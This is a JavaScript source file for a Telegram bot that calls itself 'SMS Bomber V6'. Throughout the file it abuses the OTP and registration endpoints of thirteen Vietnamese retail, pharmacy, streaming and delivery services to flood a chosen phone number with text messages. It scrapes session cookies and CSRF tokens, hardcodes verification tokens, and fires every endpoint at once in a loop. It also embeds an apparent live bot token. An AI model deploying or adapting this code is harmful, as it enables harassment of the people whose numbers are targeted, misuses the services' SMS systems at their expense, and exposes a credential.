// api/sms.js
// Bot Telegram SMS Bomber V6 - TỐI ƯU TỐC ĐỘ + CHỐNG TRÙNG

import { Telegraf } from 'telegraf';

// ============================================
// 1. CẤU HÌNH BOT
// ============================================
const BOT_TOKEN = '8624782345:AAHjhUAwov-IDPsIXkiX2V10U8GcFqE0C-E'; // <<<< THAY BẰNG TOKEN THẬT
const bot = new Telegraf(BOT_TOKEN);

// ============================================
// 2. BIẾN TOÀN CỤC
// ============================================
const activeAttacks = new Map();
const processedMessages = new Set(); // Chống xử lý trùng tin nhắn
const tokenCache = {}; // Cache token để không phải lấy lại mỗi lần

// Xóa tin nhắn đã xử lý sau 5 phút để tránh tràn bộ nhớ
setInterval(() => {
    if (processedMessages.size > 1000) processedMessages.clear();
}, 300000);

// ============================================
// 3. HÀM GỌI API CHUNG
// ============================================
async function callApi(url, options = {}) {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 6000);
    try {
        const response = await fetch(url, { ...options, signal: controller.signal, redirect: 'follow' });
        clearTimeout(timeout);
        return response;
    } catch (error) {
        clearTimeout(timeout);
        return null;
    }
}

// ============================================
// 4. HÀM LẤY TOKEN (CÓ CACHE - CHỈ LẤY 1 LẦN)
// ============================================

async function getTV360Token() {
    if (tokenCache.tv360) return tokenCache.tv360;
    try {
        const res = await callApi('http://m.tv360.vn/login', {
            headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html', 'Accept-Language': 'vi-VN,vi;q=0.9' }
        });
        if (res) {
            const cookies = res.headers.get('set-cookie') || '';
            tokenCache.tv360 = { sessionCookie: cookies.split(';')[0] || '' };
            return tokenCache.tv360;
        }
    } catch (e) {}
    return null;
}

async function getTGDDSession() {
    if (tokenCache.tgdd) return tokenCache.tgdd;
    try {
        const res = await callApi('https://www.thegioididong.com/lich-su-mua-hang/dang-nhap', {
            headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html', 'Accept-Language': 'vi-VN,vi;q=0.9' }
        });
        if (res) {
            const html = await res.text();
            const cookies = res.headers.get('set-cookie') || '';
            const match = html.match(/RequestVerificationToken" type="hidden" value="([^"]+)"/);
            tokenCache.tgdd = {
                cookie: cookies.split(';')[0] || '',
                token: match ? match[1] : 'CfDJ8Btx1b7t0ERJkQbRPSImfvKmEuGLjG73Nu3OcrziLWklJso95JQREBpSricRSiqNboVDzkobizZ8BC1MYLuRHBg0MFyAI4296BdzGcULqSvabfm1n-kajaC3BTIGmM2yamwUAzHMBo56K9VcLGn9G68'
            };
            return tokenCache.tgdd;
        }
    } catch (e) {}
    return null;
}

async function getBibaboSession() {
    if (tokenCache.bibabo) return tokenCache.bibabo;
    try {
        const res = await callApi('https://bibabo.vn/user/signupPhone', {
            headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html', 'Accept-Language': 'vi-VN,vi;q=0.9' }
        });
        if (res) {
            const cookies = res.headers.get('set-cookie') || '';
            const xsrfMatch = cookies.match(/XSRF-TOKEN=([^;]+)/);
            tokenCache.bibabo = { cookie: cookies, xsrfToken: xsrfMatch ? decodeURIComponent(xsrfMatch[1]) : '' };
            return tokenCache.bibabo;
        }
    } catch (e) {}
    return null;
}

async function getConCungSession() {
    if (tokenCache.concung) return tokenCache.concung;
    try {
        const res = await callApi('https://concung.com/dang-nhap.html', {
            headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html', 'Accept-Language': 'vi-VN,vi;q=0.9' }
        });
        if (res) {
            tokenCache.concung = { cookie: res.headers.get('set-cookie') || '' };
            return tokenCache.concung;
        }
    } catch (e) {}
    return null;
}

// ============================================
// 5. CÁC HÀM SPAM (TỐI ƯU - DÙNG TOKEN CACHE)
// ============================================

async function tv360(phone) {
    const token = await getTV360Token();
    const headers = {
        "Host": "m.tv360.vn", "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0", "Origin": "http://m.tv360.vn",
        "Referer": "http://m.tv360.vn/login", "Accept-Language": "vi-VN,vi;q=0.9",
    };
    if (token && token.sessionCookie) headers["Cookie"] = token.sessionCookie;
    return callApi("http://m.tv360.vn/public/v1/auth/get-otp-login", {
        method: 'POST', headers, body: JSON.stringify({ msisdn: "0" + phone.substring(1) })
    });
}

async function nhathuoclongchau(sdt) {
    const deviceId = 'WEB-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
    return callApi('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', {
        method: 'POST',
        headers: {
            'Host': 'api.nhathuoclongchau.com.vn', 'accept': 'application/json',
            'user-agent': 'Mozilla/5.0', 'x-channel': 'EStore', 'order-channel': '1',
            'content-type': 'application/json', 'origin': 'https://nhathuoclongchau.com.vn',
            'referer': 'https://nhathuoclongchau.com.vn/', 'accept-language': 'vi-VN,vi;q=0.9',
        },
        body: JSON.stringify({ phoneNumber: sdt, otpType: 0, fromSys: "WEBKHLC" })
    });
}

async function tgdd(sdt) {
    const session = await getTGDDSession();
    const headers = {
        'Host': 'www.thegioididong.com', 'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.thegioididong.com', 'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'accept-language': 'vi-VN,vi;q=0.9',
    };
    if (session) headers['Cookie'] = session.cookie;
    const body = new URLSearchParams({
        phoneNumber: sdt, isReSend: 'false', sendOTPType: '1',
        __RequestVerificationToken: session ? session.token : 'CfDJ8Btx1b7t0ERJkQbRPSImfvKmEuGLjG73Nu3OcrziLWklJso95JQREBpSricRSiqNboVDzkobizZ8BC1MYLuRHBg0MFyAI4296BdzGcULqSvabfm1n-kajaC3BTIGmM2yamwUAzHMBo56K9VcLGn9G68',
    });
    return callApi('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', { method: 'POST', headers, body: body.toString() });
}

async function bibabo(sdt) {
    const session = await getBibaboSession();
    const headers = {
        "Host": "bibabo.vn", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0",
        "Origin": "https://bibabo.vn", "Referer": "https://bibabo.vn/user/signupPhone",
        "Accept-Language": "vi-VN,vi;q=0.9",
    };
    if (session) {
        headers['Cookie'] = session.cookie;
        if (session.xsrfToken) headers['X-XSRF-TOKEN'] = session.xsrfToken;
    }
    return callApi("https://bibabo.vn/user/verify-phone", {
        method: 'POST', headers, body: new URLSearchParams({ phone: sdt, token: "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS" }).toString()
    });
}

async function concung(phone) {
    const session = await getConCungSession();
    const headers = {
        "Host": "concung.com", "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0",
        "origin": "https://concung.com", "referer": "https://concung.com/dang-nhap.html",
        "accept-language": "vi-VN,vi;q=0.9",
    };
    if (session) headers['Cookie'] = session.cookie;
    return callApi("https://concung.com/ajax.html", {
        method: 'POST', headers,
        body: new URLSearchParams({ ajax: "1", classAjax: "AjaxLogin", methodAjax: "sendOtpLogin", customer_phone: phone, id_customer: "0", momoapp: "0", back: "khach-hang.html" }).toString()
    });
}

async function fpt(phone) {
    return callApi("https://fptshop.com.vn/api-data/loyalty/Home/Verification", {
        method: 'POST',
        headers: {
            "Host": "fptshop.com.vn", "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0",
            "origin": "https://fptshop.com.vn", "referer": "https://fptshop.com.vn/",
        },
        body: new URLSearchParams({ phone: phone }).toString()
    });
}

async function popeyes(sdt) {
    return callApi('https://api.popeyes.vn/api/v1/register', {
        method: 'POST',
        headers: {
            'Host': 'api.popeyes.vn', 'accept': 'application/json', 'x-client': 'WebApp',
            'user-agent': 'Mozilla/5.0', 'content-type': 'application/json',
            'origin': 'https://popeyes.vn', 'referer': 'https://popeyes.vn/',
        },
        body: JSON.stringify({ phone: sdt, firstName: "Test", lastName: "User", email: "t" + Date.now() + "@gmail.com", password: "Test@12345" })
    });
}

async function winmart(sdt) {
    return callApi(`https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo=${sdt}`, {
        headers: {
            'Host': 'api-crownx.winmart.vn', 'accept': 'application/json',
            'authorization': 'Bearer undefined', 'user-agent': 'Mozilla/5.0',
            'origin': 'https://winmart.vn', 'referer': 'https://winmart.vn/',
        }
    });
}

async function pharmacity(sdt) {
    return callApi('https://api-gateway.pharmacity.vn/customers/register/otp', {
        method: 'POST',
        headers: {
            'Host': 'api-gateway.pharmacity.vn', 'user-agent': 'Mozilla/5.0',
            'content-type': 'application/json', 'origin': 'https://www.pharmacity.vn',
            'referer': 'https://www.pharmacity.vn/',
        },
        body: JSON.stringify({ phone: sdt, referral: "" })
    });
}

async function pizzahut(sdt) {
    return callApi("https://pizzahut.vn/callApiStorelet/user/registerRequest", {
        method: 'POST',
        headers: {
            "Host": "pizzahut.vn", "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0", "Origin": "https://pizzahut.vn",
            "Referer": "https://pizzahut.vn/signup",
        },
        body: JSON.stringify({ keyData: "appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone=" + sdt })
    });
}

async function gapo(sdt) {
    const deviceId = "d" + Date.now() + Math.random().toString(36).substr(2, 4);
    return callApi("https://api.gapo.vn/auth/v2.0/signup", {
        method: 'POST',
        headers: {
            "Host": "api.gapo.vn", "Content-Type": "application/json",
            "Authorization": "Bearer", "User-Agent": "Mozilla/5.0",
            "Origin": "https://www.gapo.vn", "Referer": "https://www.gapo.vn/",
        },
        body: JSON.stringify({ device_id: deviceId, phone_number: "+84-" + sdt.substring(1), otp_type: 0 })
    });
}

async function ghn(sdt) {
    return callApi('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', {
        method: 'POST',
        headers: {
            'Host': 'online-gateway.ghn.vn', 'accept': 'application/json',
            'user-agent': 'Mozilla/5.0', 'content-type': 'application/json',
            'origin': 'https://sso.ghn.vn', 'referer': 'https://sso.ghn.vn/',
        },
        body: JSON.stringify({ phone: sdt, type: "register" })
    });
}

async function fptplay(sdt) {
    return callApi('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=WWHbn-h7R9s60bp1YARxeg&e=' + Math.floor(Date.now()/1000 + 3600) + '&device=Chrome&drm=1', {
        method: 'POST',
        headers: {
            'Host': 'api.fptplay.net', 'accept': 'application/json',
            'user-agent': 'Mozilla/5.0', 'x-did': 'd' + Date.now(),
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://fptplay.vn', 'referer': 'https://fptplay.vn/',
        },
        body: JSON.stringify({ phone: sdt, country_code: "VN", client_id: "vKyPNd1iWHodQVknxcvZoWz74295wnk8" })
    });
}

// ============================================
// 6. DANH SÁCH API (ƯU TIÊN API SỐNG)
// ============================================
const spamFunctions = [
    tv360, nhathuoclongchau, fpt, popeyes, winmart,
    pharmacity, pizzahut, gapo, ghn, fptplay,
    tgdd, bibabo, concung,
];

// ============================================
// 7. LOGIC BOT TELEGRAM
// ============================================

bot.start((ctx) => {
    ctx.reply(
        '🔥 *SMS BOMBER V6 - SIÊU TỐC*\n\n' +
        '📋 *Lệnh:*\n' +
        '  • /sms [sđt] [số lần] - Bắt đầu\n' +
        '  • /stop - Dừng ngay\n' +
        '  • /status - Xem trạng thái\n\n' +
        '📱 *Ví dụ:* /sms 0912345678 10\n\n' +
        '⚡ Tối ưu tốc độ, cache token!',
        { parse_mode: 'Markdown' }
    );
});

bot.command('status', (ctx) => {
    const attack = activeAttacks.get(ctx.chat.id);
    if (attack && attack.isRunning) {
        ctx.reply(`🟢 *Đang chạy!*\n📱 ${attack.phone}\n✅ OK: ${attack.ok} | ❌ Fail: ${attack.fail}`, { parse_mode: 'Markdown' });
    } else {
        ctx.reply('⚪ *Không có gì đang chạy.*', { parse_mode: 'Markdown' });
    }
});

bot.command('stop', (ctx) => {
    const attack = activeAttacks.get(ctx.chat.id);
    if (attack && attack.isRunning) {
        attack.stopRequested = true;
        ctx.reply('⏹️ *Đang dừng...*', { parse_mode: 'Markdown' });
    } else {
        ctx.reply('⚠️ *Không có gì để dừng!*', { parse_mode: 'Markdown' });
    }
});

bot.command('sms', async (ctx) => {
    const chatId = ctx.chat.id;
    const msgId = ctx.message.message_id;
    
    // Chống xử lý trùng
    if (processedMessages.has(msgId)) return;
    processedMessages.add(msgId);
    
    const existingAttack = activeAttacks.get(chatId);
    if (existingAttack && existingAttack.isRunning) {
        return ctx.reply('⚠️ *Đang chạy dở!* Gửi /stop trước.', { parse_mode: 'Markdown' });
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply('❌ *Cú pháp:* /sms [sđt] [số lần]', { parse_mode: 'Markdown' });
    }

    const phone = args[1];
    const amount = parseInt(args[2], 10);

    if (!/^0\d{9,10}$/.test(phone)) {
        return ctx.reply('❌ *Số không hợp lệ!*', { parse_mode: 'Markdown' });
    }

    if (isNaN(amount) || amount < 1 || amount > 10) {
        return ctx.reply('⚠️ *Số lần từ 1-10!*', { parse_mode: 'Markdown' });
    }

    const attackState = {
        isRunning: true, stopRequested: false, phone: phone,
        ok: 0, fail: 0, startTime: Date.now(),
    };
    activeAttacks.set(chatId, attackState);

    const startMsg = await ctx.reply(
        `🚀 *BẮT ĐẦU V6!*\n📱 \`${phone}\`\n🔄 ${amount} lần x ${spamFunctions.length} API\n⚡ Đang gửi...\n🛑 /stop để dừng`,
        { parse_mode: 'Markdown' }
    );

    for (let i = 0; i < amount; i++) {
        if (attackState.stopRequested) break;
        
        // Gửi tất cả API cùng lúc (không đợi từng cặp)
        const promises = spamFunctions.map(fn => fn(phone));
        const results = await Promise.allSettled(promises);
        
        results.forEach(r => {
            if (r.value) attackState.ok++;
            else attackState.fail++;
        });
        
        activeAttacks.set(chatId, attackState);
        
        // Chỉ nghỉ 0.8s giữa các lần
        if (i < amount - 1 && !attackState.stopRequested) {
            await new Promise(resolve => setTimeout(resolve, 800));
        }
    }

    attackState.isRunning = false;
    const elapsed = Math.round((Date.now() - attackState.startTime) / 1000);
    
    ctx.telegram.editMessageText(
        startMsg.chat.id, startMsg.message_id, undefined,
        `✅ *HOÀN THÀNH V6!*\n📱 \`${phone}\`\n📤 Requests: ${attackState.ok + attackState.fail}\n✅ OK: ${attackState.ok}\n❌ Fail: ${attackState.fail}\n⚡ ${elapsed}s\n\n💡 API miễn phí - Tỉ lệ tùy thuộc nhà mạng!`,
        { parse_mode: 'Markdown' }
    );
    
    // Xóa cache token sau mỗi phiên để lấy token mới cho lần sau
    Object.keys(tokenCache).forEach(k => delete tokenCache[k]);
    
    setTimeout(() => activeAttacks.delete(chatId), 60000);
});

// ============================================
// 8. WEBHOOK HANDLER CHO VERCEL
// ============================================
export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            await bot.handleUpdate(req.body);
            res.status(200).json({ status: 'ok' });
        } catch (error) {
            console.error('Bot Error:', error);
            res.status(200).json({ status: 'error' });
        }
    } else {
        res.status(200).json({ status: 'Bot V6 running!', version: '6.0', features: ['cache-token', 'anti-duplicate', 'speed-optimized'] });
    }
}
